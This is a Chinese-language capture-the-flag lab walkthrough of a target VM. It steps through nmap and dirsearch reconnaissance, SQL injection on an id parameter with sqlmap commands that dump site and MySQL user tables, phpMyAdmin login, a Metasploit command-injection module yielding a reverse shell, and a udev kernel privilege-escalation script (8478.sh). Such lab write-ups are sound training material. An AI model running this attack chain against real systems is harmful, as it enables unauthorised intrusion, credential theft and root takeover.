CTF6 靶场

0. 环境配置

主机 IP
攻击机 192.168.134.1
靶机 192.168.134.138

1. netdiscover 同段主机存活主机探测

sudo netdiscover -i eth0 -r 192.168.134.0/24

2. Nmap主机开放服务探测

2.1 mini-rate 快速探测主机开放服务

sudo nmap –min-rate 10000 -p- -Pn 192.168.134.138

​ 可以看到这里开放了22、80、443、3306等端口

2.2 TCP服务开放性探测

sudo nmap -sT -sV -sC -O -p 22,80,110,111,143,443,623,993,995,3306 192.168.134.138

2.3 UDP服务开放性探测

sudo nmap –min-rate 10000 -p- sU -v 192.168.134.152

2.4 服务端vuln脚本探测

sudo nmap –script=vuln -p 22,80,110,111,143,443,623,993,995,3306 192.168.134.138

3. 渗透测试

3.1. 根据Nmap扫描结果，对80端口web服务进行测试

​ 可以看到web服务搭建了一个类似广告新闻投放的站点

​ 在页面上累哦看到很多新闻信息，那么点击’Read more’，查看广告详情，发现URL跳转到了一个http://192.168.134.138?id=4上，经测试发现当前显示的新闻内容是通过id参数进行控制的，怀疑此处存在SQL注入，访问http://192.168.134.138?id=4' 页面出现异常，无法加载新闻

​ 访问 http://192.168.134.138?id=4' or '1'='1页面又重新再加新闻

3.2 News & Announcements 处存在 sql注入

​ 对id进行简单的SQL注入测试，页面不回显，我们直接sqlmap一把梭哈：

sqlmap -u “http://192.168.134.138/?id=4*” –banner

sqlmap -u “http://192.168.134.138/?id=4*” –dbms mysql –dbs

sqlmap -u “http://192.168.134.138/?id=4*” –dbms mysql -D cms –tables

sqlmap -u “http://192.168.134.138/?id=4*” –dbms mysql -D cms -T user –dump

​ 通过SQL注入成功获取web站点登录账号密码

user_username: admin

user_password: adminpass

3.3 通过账号/密码登陆

​ 点击Log In，使用刚刚爆破出来的账号密码进行登录，成功登录，但是用firefox打开页面会存在回显问题，不过不影响渗透

​ 发现登录成功后并没有有效的功能点让我get shell

3.4 dirsearch 站点路径爆破

​ 换个思路，先进行路径爆破，查看是否有敏感路径泄露

dirsearch -u “http://192.168.134.138/“

​ 可以看见这里暴露出了PHPMyadmin软件的web端管理路径

3.5 SQL注入获取mysql用户的账号/密码

​ 可以看见当前站点存在PHPMyadmin这个管理工具，但是我们不知道账号密码怎么办，可以使用上面的SQL注入点进行获取，因为一般情况下mysql数据库的用户名密码都是保存在软件中的(保存路径为mysql数据库下的user表中)

sqlmap -u “http://192.168.134.138/?id=4*” –dbms mysql -D mysql -T user –dump

​ 但因为其都是采用加密方式存储的，运气好的情况下可以将密文解开

3.6 站点PHPMyadmin登录

​ 访问PHPMyadmin管理路径http://192.168.134.138/phpmyadmin/,使用上述爆破出来的用户名密码进行登录，成功!

​ 经过测试发现，存在secure_file_priv限制，无法直接通过备份写shell获取权限，那么眼下可以考虑下面两种方法:

  • phpmyadmin固有漏洞
  • 日志备份绕过限制

3.7. PHPMyAdmin 命令注入

​ 这里我们使用集成化环境metasploit进行渗透，使用search模块搜索phpmyadmin相关漏洞

​ 发现低版本的PHPMyadmin存在命令注入漏洞，那么我们填写所需参数，并执行

​ 执行相关载荷进行攻击

​ 攻击成功，成功反弹shell

3.8 上传内核漏洞扫描脚本

​ 一开始扫描出来的结果误报率比较高，我几乎都尝试了一遍，但是都是提权失败了

3.9 udev内核提权

​ 后面想着，是我的顺序错了，我应该先查看一下当前系统的内核版本

uanme -a

​ 显示结果为kernel 2.6 版本的，这个版本有个很著名的提权漏洞就是 udev 提权

​

​ 在本地使用 searchsploit 查找相关漏洞，并将对应的POC拷贝到当前路径以便上传

​ 将脚本从文本格式转换为 unix 格式

dos2unix 8478.sh

​

​ 上传脚本到环境中，给予脚本可执行权限，并执行(能够成功，但是需要多次尝试)

通过msfconsole上传脚本文件

upload /home/kali/Desktop/8478.sh /tmp

ls -al

chmod +x 8478.sh

查看udev进程序列号 或者使用 cat /proc/net/netlink

ps -ef | grep udev

./8478.sh [:替换一个进程pid]
